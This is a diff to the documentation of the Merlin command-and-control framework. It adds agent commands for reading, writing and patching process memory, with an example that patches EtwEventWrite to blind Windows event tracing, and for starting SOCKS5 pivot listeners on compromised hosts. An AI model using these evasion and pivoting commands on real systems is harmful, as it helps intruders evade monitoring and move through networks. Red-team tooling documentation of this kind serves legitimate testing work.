@@ -84,6 +84,8 @@ The ``core`` commands are available to every agent regardless of which operating
                | to checkin                     |
       sleep    | Set the agent's sleep interval | sleep 30s
                | using Go time format           |
+      socks    | Start a SOCKS5 listener        | [list, start, stop]
+               |                                | <interface:port> <agentID>
       ssh      | Execute command on remote host | ssh <user> <pass> <host:port>
                | over SSH (non-interactive      | <program> [<args>]
       status   | Print the current status of    |
@@ -137,6 +139,9 @@ These commands are only available to agents running on a ``Windows`` operating s
       list-assemblies   | List the .NET assemblies that  |
                         | are loaded into the agent's    |
                         | process                        |
+      memory            | Read or write memory for a     | memory <patch,read,write>
+                        | provided module and function   | <module> <procedure> [length,
+                        |                                | bytes]
       netstat           | display network connections    | netstat [-p tcp|udp]
       pipes             | Enumerate all named pipes      |
       ps                | Get a list of running          |
@@ -953,6 +958,76 @@ for detection guidance.
 
     [+] Hello from a Python script
 
+memory
+------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
+The ``memory`` command is used to interact with the agent's virtual memory through the following methods:
+
+    * patch_
+    * read_
+    * write_
+
+Uses direct syscalls for ``NtReadVirtualMemory``, ``NtProtectVirtualMemory``, & ``ZwWriteVirtualMemory`` implemented
+using `BananaPhone <https://github.com/C-Sto/BananaPhone>`__
+
+.. _patch:
+
+patch
+^^^^^
+
+The ``patch`` command locates the address of the provided procedure/function, reads the existing bytes, and the
+overwrites them with the provided bytes. A second read is performed to validate the write event. The command would be
+the same as calling the ``read`` and ``write`` commands individually.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory patch ntdll.dll EtwEventWrite 9090C3
+    [-] Created job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [-] Results job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Read  3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC
+    Wrote 3 bytes to   ntdll.dll!EtwEventWrite: 9090C3
+    Read  3 bytes from ntdll.dll!EtwEventWrite: 9090C3
+
+.. _read:
+
+read
+^^^^
+
+The ``read`` command locates the address of the provided procedure/function and reads the specified number of bytes.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory read ntdll.dll EtwEventWrite 3
+    [-] Created job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [-] Results job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Read 3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC
+
+.. _write:
+
+write
+^^^^^
+
+The ``write`` command locates teh address of the provided procedure/function and writes the specified bytes.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory write ntdll.dll EtwEventWrite 9090C3
+    [-] Created job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [-] Results job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Wrote 3 bytes to ntdll.dll!EtwEventWrite: 9090C3
+
+
 netstat
 -------
 
@@ -1530,6 +1605,73 @@ The ``sleep`` control type is used to change the amount of time that an agent wi
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep 15s
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
     [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+socks
+-----
+
+The ``socks`` command is used to start, stop, or list SOCKS5 listeners. There can only be one SOCKS5 listener per agent.
+
+* :ref:`socks list`
+* :ref:`socks start`
+* :ref:`socks stop`
+
+.. _socks list:
+
+list
+^^^^
+
+The ``list`` command will list active SOCKS5 listeners per agent. If the SOCKS5 listener was configured to listen on
+all interfaces (e.g., 0.0.0.0), then the interface will be listed as ``[::]:``.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks list
+    [i]
+            Agent                           Interface:Port
+    ==========================================================
+    c1090dbc-f2f7-4d90-a241-86e0c0217786    127.0.0.1:9050
+    7be9defd-29b8-46ee-8d38-0f3805e9233f    [::]:9051
+    6d8a3a59-e484-40b3-977b-530b351106a6    192.168.1.100:9053
+
+.. _socks start:
+
+start
+^^^^^
+
+.. warning::
+    SOCKS5 listeners do not require authentication. Control access accordingly using firewall rules or SSH tunnels.
+
+.. note::
+    In most cases you should only bind to the loopback adapter, 127.0.0.1, to prevent unintentionally exposing the port.
+
+The ``start`` command will start a SOCKS5 listener for the current agent. This command takes an optional third argument
+of the interface and port, or just the port, that you want to bind the listener to. If a third argument is not provided
+the listener will default to listen on ``127.0.0.1:9050``.
+
+
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks start
+    [-] Started SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9050
+
+.. code-block:: text
+
+    Merlin[agent][7be9defd-29b8-46ee-8d38-0f3805e9233f]» socks start 0.0.0.0:9051
+    [-] Started SOCKS listener for agent 7be9defd-29b8-46ee-8d38-0f3805e9233f on 0.0.0.0:9051
+
+.. _socks stop:
+
+stop
+^^^^
+
+The ``stop`` command will stop and remove the SOCKS5 listener for the current agent.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks stop
+    [-] Successfully stopped SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9055
+
 
 ssh
 ---
